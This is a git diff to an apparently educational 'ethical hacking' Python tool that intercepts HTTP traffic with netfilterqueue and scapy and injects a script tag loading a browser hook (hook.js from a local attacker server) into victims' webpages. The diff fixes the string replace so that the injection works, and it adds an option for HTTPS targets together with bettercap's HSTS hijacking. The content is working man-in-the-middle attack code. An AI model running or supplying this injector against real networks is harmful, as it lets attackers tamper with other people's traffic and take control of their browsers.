@@ -2,6 +2,7 @@
 import netfilterqueue
 import scapy.all as scapy
 import re
+import argparse
 
 
 # usable ONLY with HTTP connections
@@ -45,7 +46,7 @@ def process_packet(packet):
             # code to be injected in the webpage
             injection_code = '<script src="http://127.0.0.1:3000/hook.js"></script>'
             # injection taking place
-            load = load.replace("</body>, injection_code" + "</body>")
+            load = load.replace("</body>", injection_code + "</body>")
 
             # modifying Content-Length attribute to include injected code
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
@@ -60,6 +61,23 @@ def process_packet(packet):
             packet.set_payload(str(new_packet))
 
     packet.accept()
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser(
+        prog='code_injector',
+        description="Used for injecting potentially malicious code into a target webpage",
+        epilog='Part of EthicalHackingTools.'
+    )
+
+    parser.add_argument("-s", "--https", dest="https", action="store_true",
+                        help="Toggle if used against http or https target. To be used with bettercap's hstshijack.")
+
+    options = parser.parse_args()
+    return options
+
+
+arguments = get_arguments()
 
 
 queue = netfilterqueue.NetfilterQueue()
